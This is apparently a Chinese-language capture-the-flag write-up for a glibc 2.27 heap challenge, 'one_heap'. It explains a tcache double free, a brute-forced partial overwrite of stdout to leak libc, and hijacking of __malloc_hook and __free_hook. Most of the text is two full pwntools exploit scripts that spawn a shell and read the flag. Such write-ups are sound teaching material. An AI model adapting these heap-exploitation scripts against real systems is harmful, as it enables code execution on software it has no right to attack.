[TOC]
# checksec
```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled

```
# 流程
1. alloc 分配size < 0x7f 大小的堆 ，offbyone
2. delete 仅能释放上次allloc 的堆
3. 限制delete操作次数


# 利用点
    tcache double free (tcache free 两次以后 alloc 分配三次 索引计数为ff , 再free 得到main+88 偏移地址
    io leak(第一次地址爆破)
    hijack malloc_hook(第二次)

# exp

~~exp失败，猜测原因 得到的main+88 地址与_IO_stdout 地址相差0x10000 （错误）~~

开启地址化随机处理后， 脚本是成功的（但是实际关闭地址话随机处理以后是在0x10000位上是有偏移的，不能实现），更加好奇地址化随机处理是如何实现的了。

## 利用流程
1.  double free 三个malloc ，计数=0xff ，free 获取libc 
2. 部分写爆破stdout , leak libc
3. 修改tcache结构
4. hijack 

## exp


```
from pwn import *
#context.log_level="debug"
def add(size,content="\n"):
    f.sendlineafter("choice","1")
    f.sendlineafter("size",str(size))
    if size:
        f.sendafter("content",content)
def dele():
    f.sendlineafter("choice","2")
i=0
libc=ELF("./libc-2.27.so",checksec=False)
while True:
    try:
        print i
        f=process("./one_heap")
        #f=remote("47.104.89.129",10001)
        add(0x7f)
        dele()
        dele()
        # 构建overlap
        add(0x3f,(p64(0x90)+p64(0x20))*3+"\n")
        dele()
        add(0x7f)
        add(0x7f)
        add(0x7f)
        dele()
        # 4bit 爆破，使用unsorted bin 分配的空间
        add(0x20,"\x50\xf7\n")#1
        # 修改unsorted bin的size，下次分配时构建overlapping
        add(0x7f,"\x00"*0x28+p64(0x91)+"\n")
        add(0x7f,p64(0)*2+p64(0xfbad1800)+p64(0)*3+"\x90\n")
        libc_base=0
        libc_base=u64(f.recvuntil("\x7f",timeout=0.3)[-6:].ljust(8,'\0'))-0x3ec7e3
        if(libc_base==-0x3ec7e3):
            print("False1 ")
            f.close()
            i+=1
            continue
        #0x4f2c5
        #0x4f322
        #0x10a38c
        success("libc base :"+hex(libc_base))
        # 利用overlap 来覆盖tcache 的next指针
        add(0x7f,p64(0)*12+p64(libc_base+libc.symbols['__malloc_hook']+0x10+96)+"\n")
        # tcache attack 控制tcache 的分配
        add(0x3f,p64(libc_base+0x4f2c5)+"\n")
        add(0x3f,"\x00\x70\n")
        add(0x6f,p64(0)*8+p64(libc_base+libc.symbols['__malloc_hook'])+p64(libc_base+libc.symbols['__free_hook'])+"\n")
        add(0x1f,p64(libc_base+0x4f322)+"\n")
        add(0xf,p64(libc_base+libc.symbols['free'])+"\n")
        add(0)
        sleep(0.3)
        f.sendline("cat flag")
        sleep(0.2)
        f.sendline("cat flag.txt")
        f.interactive()
    except Exception as e :
        print e.message
        print "false2 "
        i+=1
        sleep(0.5)
        f.close()
        pass
f.interactive()
```

## 修正
和官方的wp相比 ， 多使用了一次dele 所以要__malloc_hook = __free_hook , 在__free_hook = system，思路显得复杂，简化代码
1. double free 控制tcahce 结构
2. 部分覆盖到stdout ，leak libc
3. 通过已控制的tcache 结构 ，部分覆盖到__free_hook
4. hijack free_hook
```
from pwn import *
#context.log_level = 'debug'
def alloc(size,data):
    p.sendlineafter("choice:","1")
    p.sendlineafter("size:",str(size))
    p.sendafter("content:",data)


def delete():
    p.sendlineafter("choice:","2")


def pwn():
    global p
    p = process("./one_heap")
#double free
    alloc(0x48,"0\n")
    delete()
    delete()
    alloc(0x48,"\x10\x70\n")
    alloc(0x48,"\n")
    alloc(0x48,"\x00"*0x23+"\x07\n")
#put into unsorted bins
    delete()
    alloc(0x40,"\n")
    alloc(0x18,p64(0)+"\x50\xe7\n")
    gdb.attach(p)
    alloc(0x40,p64(0)*2+p64(0xfbad3c80)+p64(0)*3+"\x08"+"\n")
    libc = u64(p.recv(8))-0x7ffff7dd18b0+0x00007ffff79e4000
    success("libc"+str(hex(libc)))
    free_hook = libc + 0x3ed8e8 -0x10
    alloc(0x10,p64(free_hook)+"\n")
    alloc(0x70,"/bin/sh\0".ljust(0x10,"\x00")+p64(libc+0x4f440)+"\n")
    delete()
    p.interactive()


i = 0
while True:
    try:
        pwn()
    except:
        i=i+1
        p.close()
        print i

```

